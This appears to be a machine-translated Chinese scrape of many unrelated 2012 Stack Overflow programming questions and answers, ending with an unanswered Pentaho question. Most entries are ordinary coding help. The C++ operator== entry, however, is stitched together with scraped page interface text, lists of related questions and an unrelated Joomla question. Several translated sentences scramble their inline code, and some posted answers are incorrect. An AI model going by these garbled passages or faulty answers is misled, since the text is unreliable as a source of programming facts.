我在我的网站上添加了一个宽度为 288 的 Facebook 评论框。它工作正常，唯一的问题是当我尝试删除我发布的评论时，删除按钮的某些部分隐藏在插件宽度 288 内。

有什么方法可以让我减小宽度删除弹出框，使其适合我指定的宽度。

我还想知道是否有任何方法可以使用我的自定义样式更改其 CSS。

我无法通过 CSS 或 jQuery 找到评论框的任何 Dom 元素。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:05:47.113

您可以使用 Javascript 将 CSS 文件添加到 iFrame：

```
var cssLink = document.createElement("link") 
cssLink.href = "file://path/to/style.css"; 
cssLink .rel = "stylesheet"; 
cssLink .type = "text/css"; 
frames['iframe'].document.body.appendChild(cssLink); 
```

您只需要实现您的 CSS 文件并在适当的时候使用此代码。

# windows-8 - LinqConnect 开发数据库驱动的 Windows 8 Metro 应用程序？

> ID：12213779
> 
> 赞同：0
> 
> 时间：2012-08-31T10:46:30.573
> 
> 标签：windows-8

我可以使用[LinqConnect](http://devart.com/linqconnect/)为小型企业开发数据库驱动的 Windows 8 Metro 应用程序吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-01T03:29:51.300

显然，是的。如果您[访问他们的网站](http://www.devart.com/linqconnect/download.html)，您将看到以下内容：

![在此处输入图像描述](../Images/9f7b92d86e7eb7d1de03e8ab9a9b4c74.png)

# python - 如何在 PyGame 中将组合键 ctrl+shift+9 转换为字符串“ctrl+(”？

> ID：12213780
> 
> 赞同：0
> 
> 时间：2012-08-31T10:46:31.867
> 
> 标签：python, pygame

我`event.unicode`以前用于此任务。如果我点击`shift`+ `9`，那么按键事件的 unicode 属性为 '('。如果我点击`shift`+ `alt`+ `9`，那么按键事件的 unicode 属性为 '('，键盘也会发送一个keydown 用于 alt 键，以便我知道按下了一个。

但是，如果我按`ctrl`+ `shift`+ `9`，那么`event.unicode == u''`. 我如何从中`u'('`恢复过来？

（同样，对于`ctrl`++ ，我得到`shift`）`a``'\x01'`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:31:21.853

好吧，您在按下时查看的所有击键`CTRL`都是“更改的”，因为这是创建`CTRL`键的全部意图：发送控制指令而不是简单的文本。

如果您查看[ASCII 表](http://www.unix-manuals.com/refs/misc/ascii-table.html)，您会看到例如`CTRL`+如何`H`映射到控制字符`BS (Backspace)`。

`'('`因此，您在这里没有机会`CTRL`仅通过.`SHIFT``9``KEY_DOWN`

* * *

您必须通过`pygame.key.get_pressed()`检查按键。

```
 if e.type == KEYDOWN:
        k = pygame.key.get_pressed()
        m = pygame.key.get_mods()
        if m & KMOD_SHIFT and k[K_9]:
            if m & KMOD_CTRL:
                print "controlled yay!"
            else:
                print "yay!" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-05T01:34:39.903

可能有一种更简单的方法可以做到这一点，但是您可以使用获取键盘上所有键的状态，`pygame.key.get_pressed()`然后检查按下的两个键是否是`Ctrl`、`Shift`和`9`键。那么您可以手动返回字符串`Ctrl`+`(`而不是从函数中获取它。不确定是否有一种非常优雅的方式来做到这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-16T17:59:35.193

检查`Ctrl`+`t`

```
`for event in pygame.event.get():
    if event.type == pygame.KEYDOWN:
        keys = pygame.key.get_pressed()
        if keys[pygame.K_LCTRL]:
            if event.key == pygame.K_t:` 
```

# javascript - Javascript / jQuery替换泰米尔语输入框中的最后一个单词？

> ID：12213783
> 
> 赞同：1
> 
> 时间：2012-08-31T10:46:42.107
> 
> 标签：javascript, jquery, tamil, indic

我需要替换输入值中的最后一个单词

我正在使用此代码，

```
Get_value =$(input).val();
new_word= "new word";

function ReplaceLastWord(Get_value, new_word) {
 return Get_value.replace(/\w*$/, new_word);
}

$(input).val(ReplaceLastWord(Get_value, new_word)); 
```

它的工作，但只适用于英语......我在输入中使用泰米尔语

```
$(input).val()="கோச்மேடிக்ஸ் ச்னக்க்ஸ்"; 
```

对于这种语言，我需要使用此代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:50:02.367

试试这个

```
 var lastWord = function(inputString,newstring) {
     inputString=inputString.replace((""+inputString).replace(/[\s-]+$/,'').split(/[\s-]/).pop(),newstring)
     alert(inputString);
};

lastWord("கோச்மேடிக்ஸ் ச்னக்க்ஸ்",'hi'); 
```

​ ​</p>

​<a href="http://jsfiddle.net/G5WgK/3/" rel="nofollow">现场演示

这里 inputString 是输入值，而 newstring 是要替换的单词。

如果这将帮助您将其标记为答案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:13:17.367

```
function ReplaceLastWord(Get_value, new_word) {
 return Get_value.substring(Get_value.lastIndexOf(" ") + 1) + new_word;
} 
```

# python - 在python中导入jenkins在mac上失败

> ID：12213784
> 
> 赞同：5
> 
> 时间：2012-08-31T10:46:45.550
> 
> 标签：python, macos, jenkins

我在 Mac 上使用`sudo easy_install python-jenkins`. 安装很顺利，没有错误，但是当我打开python并输入时，`import jenkins`出现以下错误。

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "build/bdist.macosx-10.7-intel/egg/jenkins.py", line 9, in <module>
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ctypes/__init__.py", line 431, in LoadLibrary
    return self._dlltype(name)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ctypes/__init__.py", line 353, in __init__
    self._handle = _dlopen(self._name, mode)
OSError: dlopen(/Library/Python/2.7/site-packages/lookup3.so, 6): image not found 
```

谷歌搜索这并没有产生任何有用的结果。

**编辑后的追溯**

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "jenkins.py", line 9, in <module>
    lookup3 = cdll.LoadLibrary(os.path.join(get_python_lib(), "lookup3.dynlib"))
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ctypes/__init__.py", line 431, in LoadLibrary
    return self._dlltype(name)
  File "/System/Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/ctypes/__init__.py", line 353, in __init__
    self._handle = _dlopen(self._name, mode)
OSError: dlopen(/Library/Python/2.7/site-packages/lookup3.dynlib, 6): image not found 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:53:39.420

有问题的模块与 Mac OS X 动态库约定不兼容。

它会尝试加载`lookup3.so`文件，但在 Mac 上它会`lookup3.dynlib`改为加载文件。您可以通过查看`/Library/Python/2.7/site-packages`目录来验证这一点。然后只需编辑`jenkins.py`模块并将`.so`扩展名替换为`.dynlib`.

我也会将此报告给[模块的问题跟踪器](https://github.com/lgastako/jenkins/issues)；一个简单的`if platform.system() == 'Darwin':`开关将使事物可以跨平台加载。

更新：实际上，模块固执地希望`lookup3.so`模块位于`site-packages`目录中，而不是模块本身。因此它与 easy_install 不兼容。当您将所有文件（未更改）从`.egg`目录中直接移到您的`/Library/Python/2.7/site-packages/`目录中时，它将起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2019-12-09T23:15:08.987

> OSError：dlopen（/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages/lookup3.so，6）：找不到图像

从目录中 `/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages`，，

```
ln -s lookup3.cpython-36m-darwin.so lookup3.so 
```

为我工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-07-31T09:41:02.763

我发现lookup.so jenkins.py 正在尝试加载：

```
/Users/MY-USER/Documents/Telnyx/dev/tdm-get-ips/venv/lib/python3.7/site-packages/lookup3.cpython-37m-darwin.so 
```

所以我改变了

```
python3.7/site-packages/jenkins.py 
```

线：

```
lookup3 = cdll.LoadLibrary(os.path.join(get_python_lib(), "lookup3.so")) 
```

为了：

```
lookup3 = cdll.LoadLibrary(os.path.join(get_python_lib(), "lookup3.cpython-37m-darwin.so")) 
```

它开始正常工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-08-30T06:06:04.277

你可以试试：

```
pip uninstall jenkins

pip install python-jenkins 
```

为我工作。

# c# - 在没有用户交互 30 秒后引发事件

> ID：12213786
> 
> 赞同：3
> 
> 时间：2012-08-31T10:46:56.937
> 
> 标签：c#, wpf

我正在编写一个 WPF 应用程序，如果用户在 30 秒内没有与程序交互，我想引发一个事件。也就是说，没有键盘或/和鼠标事件。

`alertstate`我想这样做的原因是因为如果变量已设置为 true ，我想引起对屏幕的注意。

我正在考虑使用类似的东西，`BackgroundWorker`但我真的不知道如何获得用户没有与程序交互的时间。有人可以指出我正确的方向吗？

我想这个问题基本上归结为检查用户是否与屏幕进行了交互。我该怎么做呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T11:17:06.760

一种方法是使用 GetLastInputInfo。此信息将为您提供自上次用户在鼠标/键盘上交互以来经过的时间（以刻度为单位）。
你可以在这里获得信息： [http](http://www.pinvoke.net/default.aspx/user32.GetLastInputInfo)
://www.pinvoke.net/default.aspx/user32.GetLastInputInfo 所以有一个计时器来检查最后一次交互的时间。如果您需要准确性，您可以例如每 5 秒检查一次，或者当您看到空闲持续 y 秒（y<30）时，设置一个一次性计时器，将在 (30- y) 秒。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T11:30:39.757

您需要记录用户最后一次移动鼠标或按键的时间，然后检查该时间是否大于您的阈值。

因此，您需要在应用程序中添加鼠标移动、鼠标单击和键盘处理程序（这是 Silverlight 代码，因此您可能需要更改命名空间等）：

```
private void AttachEvents()
{
    Application.Current.RootVisual.MouseMove += new MouseEventHandler(RootVisual_MouseMove);
    Application.Current.RootVisual.KeyDown += new KeyEventHandler(RootVisual_KeyDown);

    Application.Current.RootVisual.AddHandler(UIElement.MouseLeftButtonDownEvent, (MouseButtonEventHandler)RootVisual_MouseButtonDown, true);
    Application.Current.RootVisual.AddHandler(UIElement.MouseRightButtonDownEvent, (MouseButtonEventHandler)RootVisual_MouseButtonDown, true);
} 
```

然后在处理程序中有这样的代码用于鼠标移动：

```
private void RootVisual_MouseMove(object sender, MouseEventArgs e)
{
    timeOfLastActivity = DateTime.Now;
} 
```

和一个类似的`KeyDown`事件处理程序。

您将不得不设置一个计时器：

```
idleTimer = new DispatcherTimer();
idleTimer.Interval = TimeSpan.FromSeconds(1);
idleTimer.Tick += new EventHandler(idleTimer_Tick);

// Initialise last activity time
timeOfLastActivity = DateTime.Now; 
```

然后在滴答事件处理程序中有这样的事情：

```
private void idleTimer_Tick(object sender, EventArgs e)
{
    if (DateTime.Now > timeOfLastActivity.AddSeconds(30))
    {
        // Do your stuff
    }
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-31T11:16:55.890

使用`ComponentDispatcher.ThreadIdle`和`DispatcherTimer`来实现这一点。

```
DispatcherTimer timer;

public Window1()
{
    InitializeComponent();
    ComponentDispatcher.ThreadIdle += new EventHandler(ComponentDispatcher_ThreadIdle);
    timer = new DispatcherTimer();
    timer.Interval = TimeSpan.FromSeconds(30);
    timer.Tick += new EventHandler(timer_Tick);
}

void timer_Tick(object sender, EventArgs e)
{
    //Do your action here
    timer.Stop();
}

void ComponentDispatcher_ThreadIdle(object sender, EventArgs e)
{
    timer.Start();
} 
```

# c++ - 如果我重载了，我们是否需要重载 == 运算符 我有一个自定义类型 A 的对象（一个具有许多成员的类，这些成员是 std::string、向量等，但没有原始指针）。 现在，我有一个 A 对象列表。 A tmpobj; std::list temp; 如果我想调用 std::list::remove 函数从我正在尝试的列表中删除特定对象 问问题 问问题 2012-08-31T10:47:24.300 450 次 This question shows research effort; it is useful and clear 0 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. 我有一个自定义类型 A 的对象（一个具有许多成员的类，这些成员是 std::string、向量等，但没有原始指针）。 现在，我有一个 A 对象列表。 A tmpobj; std::list temp; 如果我想调用 std::list::remove 函数从我正在尝试的列表中删除特定对象 temp.remove(tmpobj) 现在，这是我的问题 我假设我需要重载 == 运算符。如果我不需要以及默认 == 是否有效，请告诉我。我不确定。我知道如果我没有任何基于 STL 的成员，它会起作用 我已经重载了 < 运算符。然而，我认为需要提供“==”运算符。这是正确的吗。一个参数可以是，我们可以将“==”确定为对 '<' 运算符的两次调用，例如 if(a < b || b < a) 返回 false 否则返回 true； 或者这没有完成，因为它进行 2 次调用效率低下，还是有任何其他原因。 com_messages 像组件 我想开发一个自定义组件，该组件具有在 joomla 2.5 组件中内置的 com_messages 等选项卡。任何人都可以指导我吗？ 我调查了它但没有得到它 http://docs.joomla.org/Developing_a_Model-View-Controller_Component/2.5/Adding_categories c++operator-overloading 4 2 回答 2 This answer is useful 1 n3337 23.3.5.5 void remove(const T& value); template <class predicate="">void remove_if(Predicate pred); 效果：擦除列表迭代器 i 引用的列表中的所有元素，满足以下条件：*i == value , pred(*i) != false。仅使迭代器和对已擦除元素的引用无效。 因此，您需要重载operator ==或谓词。 于 2012-08-31T10:54:28.250 回答 This answer is useful 1 没有默认值operator==，所以不用担心。当编译器抱怨你的类没有operator==时，实现它;-) 如果您的类的所有可能值一起表示具有“完全有序”的数学属性的集合，那么您可以operator==根据operator<. 它不一定是最有效的方法，但 C++ 不假设它的主要原因是，通常它不假设不同的重载运算符应该如何相互关联。并非所有类型都必须代表全序集。无论好坏，C++ 都允许您使用operator<来表示偏序。 于 2012-08-31T10:55:43.273 回答 Related 1 mongodb - Mongodb不会做任何事情 1 installation - Inno Setup PageDescriptionLabel 相互重叠 3 jquery - 带有垂直拇指托盘的超大全屏滑块 1 jquery - 发布和更改页面 2 javascript - 用javascript检测损坏的图像不起作用 5 sql - 防止任何表上的意外更新/删除 3 jqgrid - 如何根据列中的值更改 JQGrid 中的行颜色 1 unit-testing - Orchard 中 MVC 项目的单元测试 1 php - 为什么这评估为真？ 3 c - 在 ubuntu 中编译 c 程序时出错“time_struct 的存储大小未知” Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641</class>

 > ID：12213790
> 
> 赞同：0
> 
> 时间：
> 
> 标签：c++, operator-overloading

我有一个自定义类型 A 的对象（一个具有许多成员的类，这些成员是 std::string、向量等，但没有原始指针）。

现在，我有一个 A 对象列表。

```
A tmpobj;  
std::list<A> temp; 
```

如果我想调用 std::list::remove 函数从我正在尝试的列表中删除特定对象

```
temp.remove(tmpobj) 
```

现在，这是我的问题

1.  我假设我需要重载 == 运算符。如果我不需要以及默认 == 是否有效，请告诉我。我不确定。我知道如果我没有任何基于 STL 的成员，它会起作用
2.  我已经重载了 < 运算符。然而，我认为需要提供“==”运算符。这是正确的吗。一个参数可以是，我们可以将“==”确定为对 '<' 运算符的两次调用，例如

    if(a < b || b < a) 返回 false 否则返回 true；

或者这没有完成，因为它进行 2 次调用效率低下，还是有任何其他原因。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:54:28.250

n3337 23.3.5.5

```
void remove(const T& value);

template <class Predicate> void remove_if(Predicate pred); 
```

> 效果：擦除列表迭代器 i 引用的列表中的所有元素，满足以下条件：***i == value** , **pred(*i) != false**。仅使迭代器和对已擦除元素的引用无效。

因此，您需要重载`operator ==`或谓词。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:55:43.273

没有默认值`operator==`，所以不用担心。当编译器抱怨你的类没有`operator==`时，实现它;-)

如果您的类的所有可能值一起表示具有“完全有序”的数学属性的集合，那么您可以`operator==`根据`operator<`. 它不一定是最有效的方法，但 C++ 不假设它的主要原因是，通常它不假设不同的重载运算符应该如何相互关联。并非所有类型都必须代表全序集。无论好坏，C++ 都允许您使用`operator<`来表示偏序。

# php - Php 电子邮件字符编码

> ID：12213792
> 
> 赞同：0
> 
> 时间：2012-08-31T10:47:26.423
> 
> 标签：php, email

我正在使用以下代码从 php 发送电子邮件。

```
 $to = 'myemail@domain.com'; 
$subject = 'Test email with attachment'; 
$random_hash = md5(date('r', time())); 
$headers = "From: webmaster@example.com\r\nReply-To: webmaster@example.com"; 
$headers .= "\r\nContent-Type: multipart/mixed; boundary=\"PHP-mixed-".$random_hash."\""; 
if(isset($_FILES['curriculum_vitae']['name']) && $_FILES['curriculum_vitae']['name'] != ''){ $attachment = chunk_split(base64_encode(file_get_contents($_FILES['curriculum_vitae']['tmp_name']))); }
ob_start();
?> 
--PHP-mixed-<?php echo $random_hash; ?>  
Content-Type: multipart/alternative; boundary="PHP-alt-<?php echo $random_hash; ?>" 

--PHP-alt-<?php echo $random_hash; ?>  
Content-Type: text/plain; charset="iso-8859-1" 
Content-Transfer-Encoding: 7bit

Hello World!!! 
This is simple text email message. 

--PHP-alt-<?php echo $random_hash; ?>  
Content-Type: text/html; charset="iso-8859-1" 
Content-Transfer-Encoding: 7bit

<h2>Hello World!</h2> 
<p>This is something with <b>HTML</b> formatting.</p> 

--PHP-alt-<?php echo $random_hash; ?>-- 

<?php if(isset($_FILES['curriculum_vitae']['name']) && $_FILES['curriculum_vitae']['name'] != ''){ ?>--PHP-mixed-<?php echo $random_hash; ?>  
Content-Type: application/zip; name="<?php echo $_FILES['curriculum_vitae']['name']; ?>"  
Content-Transfer-Encoding: base64  
Content-Disposition: attachment  

<?php echo $attachment; ?> 
--PHP-mixed-<?php echo $random_hash; ?>--
<?php } ?>
<?php 
$message = ob_get_clean(); 
$mail_sent = @mail( $to, $subject, $message, $headers ); 
echo $mail_sent ? "Mail sent" : "Mail failed"; 
```

但是，当我在 webmail 上收到电子邮件时，我遇到了字符编码问题。“à”或“ç”等字符以奇怪的形式出现。

这是我在上面的代码中定义的编码问题吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T11:11:03.053

将标头更改为 UTF8

在`text/plain`部分

```
--PHP-alt-<?php echo $random_hash; ?>  
Content-Type: text/plain; charset="UTF-8" 
Content-Transfer-Encoding: 7bit 
```

并在`text/html`部分

```
--PHP-alt-<?php echo $random_hash; ?>  
Content-Type: text/html; charset="UTF-8" 
Content-Transfer-Encoding: 7bit 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:11:46.390

使用此代码使用 php 脚本发送邮件

```
<?php
$to = "someone@example.com";
$subject = "Test mail";
$message = "Hello! This is a simple email message.";
$from = "someonelse@example.com";
$headers = "From:" . $from;
mail($to,$subject,$message,$headers);
echo "Mail Sent.";
?> 
```

无需在脚本上设置其他信息。我不知道您为什么要设置多个标头和内容类型编码。

# c++ - 在 Windows 8 上显示虚拟键盘

> ID：12213793
> 
> 赞同：1
> 
> 时间：2012-08-31T10:47:28.043
> 
> 标签：c++, keyboard, windows-runtime

有没有办法使用 c++ 以编程方式在 Windows 8 风格的应用程序上显示虚拟键盘？

我宁愿不涉及任何 XAML，因为我正在使用 DirectX（即使我认为它们可以一起使用，但是仅仅放弃键盘支持比学习 XAML 并尝试将其与 DirectX 配合起来更容易） .

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T22:06:48.147

如果您的意思是没有用户操作，那么答案是否定的。[请参阅触摸键盘](http://msdn.microsoft.com/en-us/library/windows/apps/hh465404.aspx)中的调用和解除逻辑以及用户驱动的调用部分

[Microsoft 有一个输入：触摸键盘示例](http://code.msdn.microsoft.com/windowsapps/Touch-keyboard-sample-43532fda)，该示例演示了当用户将输入焦点移动到自定义控件时如何调出触摸键盘。请注意，该示例没有实现 TSF，因此没有完整的输入法支持。

更新：该示例针对 Windows 8.1 进行了更新。旧的 Windows 8 示例可以从[http://code.msdn.microsoft.com/windowsapps/Windows-8-app-samples-3bea89c8下载](http://code.msdn.microsoft.com/windowsapps/Windows-8-app-samples-3bea89c8)

# wpf - 将 WPF 扩展工具包 PropertyGrid 绑定到字典或其他动态源？

> ID：12213799
> 
> 赞同：3
> 
> 时间：2012-08-31T10:47:54.133
> 
> 标签：wpf, dynamicobject

我有一个包含多个子元素的 XML 文件。每个子元素都包含一系列元素，但 XML 模式没有记录，因此我无法解释所有可能的元素名称。我的目标是为每个子元素提供一个编辑器视图。例如：

**XML 文件**

```
<root>
    <element>
        <subelement1>value</subelement>
        <randomName88787>value</randomName>
        <somethingTotallyFunky>value</somethingTotallyFunky>
        <iHaveNoIdeaWhatThisWillBe>value</iHaveNoIdeaWhatThisWillBe>
    </element>
</root> 
```

我希望使用 WPF Toolkit 的 PropertyGrid 控件（或类似的控件）来显示 的所有子元素的列表`<element>`，但该控件旨在绑定到 CLR 对象。当然我不能用属性定义一个类，因为我不知道这些属性是什么。我尝试使用以下代码绑定到 expando 对象：

```
var expando = new ExpandoObject();
var dict = (IDictionary<string, object>)expando;
foreach (var prop in unit.Elements())
{
    if (dict.ContainsKey(prop.Name.LocalName) == false)
    {
        dict.Add(prop.Name.LocalName, (string)prop.Value);
    }
}

Properties.SelectedObject = expando; 
```

但不显示任何属性。它似乎不能很好地处理 ExpandoObject。有没有更好的方法来处理我正在尝试做的事情？一个更好的控制来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-02T22:53:36.803

看看[这个](http://weblogs.asp.net/bleroy/archive/2009/09/17/fun-with-c-4-0-s-dynamic.aspx "伯特兰·勒罗伊")，它应该基本上解释了一切。简而言之，实现 ICustomTypeDescriptor（在派生自 ExpandoObject 的类型上）应该可以正常工作；我查看了扩展的 WPF 工具包源代码，我认为它会正确处理它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-03T20:19:51.460

实际上，您可以在不使用任何自定义对象的情况下执行此操作。使用名为 data.xml 的文件中的示例数据尝试此 XAML：

```
<Window x:Class="MainWindow"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
Title="MainWindow" Height="350" Width="525">
<Window.Resources>
    <XmlDataProvider x:Key="data" Source="data.xml" XPath="/root/element/*"/>
</Window.Resources>
<Grid>
    <ListView ItemsSource="{Binding Source={StaticResource data}}">
        <ListView.View>
            <GridView>
                <GridViewColumn Header="Tag" Width="100">
                    <GridViewColumn.CellTemplate>
                        <DataTemplate>
                            <Label Content="{Binding Path=Name}"/>
                        </DataTemplate>
                    </GridViewColumn.CellTemplate>
                </GridViewColumn>
                <GridViewColumn Header="Value" Width="100">
                    <GridViewColumn.CellTemplate>
                        <DataTemplate>
                            <TextBox Text="{Binding Path=InnerText}"/>
                        </DataTemplate>
                    </GridViewColumn.CellTemplate>
                </GridViewColumn>
            </GridView>
        </ListView.View>
    </ListView>
</Grid>
</Window> 
```

我希望您会在 XmlDataProvider.Document 中找到用户更改的任何值，因此保存它应该会保留用户的更改。

# ios - WhiteRaccoon iOS 4.2 错误

> ID：12213804
> 
> 赞同：0
> 
> 时间：2012-08-31T10:48:04.650
> 
> 标签：ios, ftp

我有一个安装了 WhiteRaccoon 框架的应用程序。我无法编译它，因为它给了我与 WhiteRaccoon.m/h 中的保留或释放有关的任何错误。有什么想法吗？谢谢。
顺便说一句，我已经添加了 CFNetwork 框架。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:58:24.553

您的项目可能正在使用 ARC，而 WhiteRaccoon 可能不是。

您可以将 whiteRaccoon（无论是什么）转换为 ARC 或通过将以下编译器标志添加到它的源文件来排除 whiteRaccoon 文件`-fno-objc-arc`。

为此，请单击左侧的项目，然后转到“Build Phases”->“Compile Sources”，查找白色 Raccoon .m 文件并在编译器标志部分下添加 -fno-objc-arc。

另一种选择是将 WhiteRaccoon 框架编译成一个静态库，并将其作为您的项目。

# jquery - jQuery 动画页面“对齐”在滚动结束时循环

> ID：12213811
> 
> 赞同：1
> 
> 时间：2012-08-31T10:48:32.530
> 
> 标签：jquery, scroll, jquery-animate

所以我有一个垂直滚动网站，上面有“页面”。我希望浏览器在用户停止滚动时对齐最可查看的页面。

我有一种方法可以找到哪个元素是 inview，并且使用一个简单的插件我有一个在滚动停止时触发的事件。

我遇到的问题是如何正确利用它。

我正在为浏览器设置动画以在滚动停止时滚动到 inview 页面的顶部。然而，这会启动另一个滚动并再次触发所有内容，这会导致一些奇怪的持续滚动错误并导致它在页面周围跳跃。

有没有人有任何不同的实现方式来避免循环的想法？我现在真的很困。

代码如下。并感谢您的任何建议。

```
$(window).bind('scrollstop', function(e){

//this grabs the ID of the div containing my h1 element. This is how I decide which 'page' is inview
var inview = '#' + $('.section-header:in-viewport:first').parent().parent().attr('id');

//then I grab the distance from the top, so that it can be scrolled to
var this_pos = $(inview).offset().top;  

//finally I animate the page to scroll to the top of the inview element.
$('html > body').animate({'scrollTop' : this_pos}, 200).delay(1000);

}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:04:34.360

像这样的东西，也许？

```
$('body').animate({
    scrollTop: inview.offset().top - $('body').offset().top + $('body').scrollTop()
});​ 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T13:29:27.803

所以最后我通过在滚动结束时触发函数添加延迟来解决这个问题。100ms 的延迟足以防止它过早触发并在不需要时使用滚动调整页面。这导致了页面上的无限循环和怪异。

这是我的最终代码：

```
$(window).bind('scrollstop', function(e){

  var inview = '#' + $('.section-header:in-viewport:first').parent().parent().attr('id');
  var this_pos = $(inview).offset().top;    

  //animate to the top of the .page, with a 200 delay
   $('html > body').animate({'scrollTop' : this_pos}, 200);

  //a delay of 100 here is enough to stop a scrollend loop starting causing weirdness.
        }).delay(100); 
```

# javascript - 我应该如何在javascript中循环和“关联对象”？

> ID：12213814
> 
> 赞同：0
> 
> 时间：2012-08-31T10:48:44.223
> 
> 标签：javascript, for-loop

我有一个`this.themeData`类似这样的对象（显示控制台输出）

```
Object
    Banner: Object
        property: "null"
        raw: "uploads/1/somefile.png"
        selector: "null"
        value: "../../uploads/1/somefile.png"
        __proto__: Object
    H1_FontSize: Object
    H2_FontColor: Object
    H2_FontSize: Object 
```

我这样循环：

```
 for (attrName in this.themeData) {
        attrData = this.themeData[attrName];
        if (attrData.selector && attrData.value) {
            $(".SomeSelector").css(attrData.property, attrData.value);
        }
    } 
```

这行得通，但我在最近的一个[SO question](https://stackoverflow.com/questions/1963102/what-does-the-jslint-error-body-of-a-for-in-should-be-wrapped-in-an-if-statemen)中看到我不应该使用`for in`. 但是，如果索引不是不存在的数值`for(var i = 0; i<arr.length; i++)`，我该如何循环呢？`this.themeData[i]`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:50:41.103

在对象上使用 for..in 循环很好，您只需要使用 hasOwnProperty() 检查过滤它们

```
for (attrName in this.themeData) {
    if (this.themeData.hasOwnProperty(attrName)) {
        attrData = this.themeData[attrName];
        if (attrData.selector && attrData.value) {
            $(".SomeSelector").css(attrData.property, attrData.value);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:51:57.367

在我看来，使用该`for...in`方法很好，只需确保检查您正在寻找的属性不是来自原型链的某个地方。

```
var foo = Object();
for(item in foo) {
  if(foo.hasOwnProperty(item) {
      alert(item); // The key
      alert(foo[item]); // The value.
  }
} 
```

如果你不检查`hasOwnProperty`，你最终会得到继承自的属性`Object`。

# python - 将稀疏矩阵一分为二

> ID：12213818
> 
> 赞同：9
> 
> 时间：2012-08-31T10:49:01.080
> 
> 标签：python, numpy, scipy, sparse-matrix

问题：如何根据列表中的值将 1 个稀疏矩阵拆分为 2 个？

也就是说，我有一个稀疏矩阵`X`：

```
>>print type(X)
<class 'scipy.sparse.csr.csr_matrix'> 
```

我在脑海中将其想象为列表列表，如下所示：

```
>>print X.todense()
[[1,3,4]
 [3,2,2]
 [4,8,1]] 
```

我有一个`y`看起来像这样的列表：

```
y = [-1, 
      3, 
     -4] 
```

如何`X`根据对应的值`y`是正数还是负数将其分成两个稀疏矩阵？例如，我怎样才能得到：

```
>>print X_pos.todense()
 [[3,2,2]] 
>>print X_neg.todense()
 [[1,3,4]
  [4,8,1]] 
```

结果 (`X_pos`和`X_neg`) 显然也应该是稀疏矩阵，因为它只是分割一个稀疏矩阵开始。

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-31T11:14:53.553

用于[`np.where`](http://docs.scipy.org/doc/numpy/reference/generated/numpy.where.html)为正值和负值生成两个索引数组`y`，然后使用它们来索引到您的稀疏矩阵。

```
>>> X = csr_matrix([[1,3,4], [3,2,2], [4,8,1]])
>>> y = np.array([-1, 3, -4])
>>> y_pos = np.where(y > 0)[0]
>>> y_neg = np.where(y < 0)[0]
>>> X_pos = X[y_pos]
>>> X_neg = X[y_neg] 
```

您现在必须包含所需元素的 CSR 矩阵：

```
>>> X_pos
<1x3 sparse matrix of type '<type 'numpy.int64'>'
    with 3 stored elements in Compressed Sparse Row format>
>>> X_neg
<2x3 sparse matrix of type '<type 'numpy.int64'>'
    with 6 stored elements in Compressed Sparse Row format>
>>> X_pos.A
array([[3, 2, 2]])
>>> X_neg.A
array([[1, 3, 4],
       [4, 8, 1]]) 
```

# pentaho - 在 PRD 交叉表报告中隐藏行或列中的任何值时，行总和和列总和不匹配

> ID：12213821
> 
> 赞同：0
> 
> 时间：2012-08-31T10:49:01.283
> 
> 标签：pentaho

我必须从行或列中隐藏一些成员（如`[Markets].[APAC]`）。当我隐藏此成员时，在“总计”中仍显示隐藏列的计数。

这是示例查询......类似于我的要求......

```
select NON EMPTY Except({Hierarchize(Union({[Markets].[All Markets]}, [Markets].[All Markets].Children))}, {[Markets].[APAC]}) ON COLUMNS,
  NON EMPTY Hierarchize(Union({[Product].[All Products]}, [Product].[All Products].Children)) ON ROWS
from [SteelWheelsSales]
where {[Measures].[Sales]} 
```

请为此提供解决方案..

提前致谢。

萨加尔

* * *

## 回答 #1

